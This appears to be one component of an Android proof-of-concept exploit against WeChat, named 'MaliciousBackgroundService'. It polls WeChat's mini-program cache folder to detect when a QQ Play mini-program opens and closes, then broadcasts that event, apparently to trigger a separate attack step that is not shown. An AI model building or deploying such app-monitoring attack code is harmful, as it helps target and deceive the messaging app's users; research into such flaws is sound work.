package com.example.wechatexploit;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;
import java.io.File;

public class MaliciousBackgroundService extends IntentService {

    /**
     * Creates an IntentService.  Invoked by your subclass's constructor.
     */
    public MaliciousBackgroundService() {
        super("MaliciousBackgroundService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.w("MBS", "Successfully started intentService");
        boolean found = false;
        Boolean isSDPresent = android.os.Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
        String id = "INSERT QQ PLAY ID HERE";

        //set up file path
        File storage;
        if (isSDPresent) {
            storage = Environment.getExternalStorageDirectory();
        } else {
            storage = Environment.getDataDirectory();
        }
        File root = new File(storage,"tencent/MicroMsg/wxacache");

        //look for QQ play until it appears
        while (!found) {
            for (File file : root.listFiles()) {
                if (file.getName().equals(id)) {
                    found = true;
                    Log.w("MBS", "Successfully found QQ Play");
                }
            }
        }

        //Wait for qq play to disappear
        while (found) {
            found = false;
            for (File file : root.listFiles()) {
                if (file.getName().equals(id)) {
                    found = true;
                    Log.w("MBS", "QQ Play still open");
                }
            }
        }
        Log.w("MBS", "QQ Play closed");

        //Send broadcast that qq play closed. if this doesn't work look into starting a new activity
        Intent intent1 = new Intent();
        intent1.setAction("QQ Play closed");
        sendBroadcast(intent1);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.w("MBS", "MyIntentService onCreate() method is invoked.");
    }
}
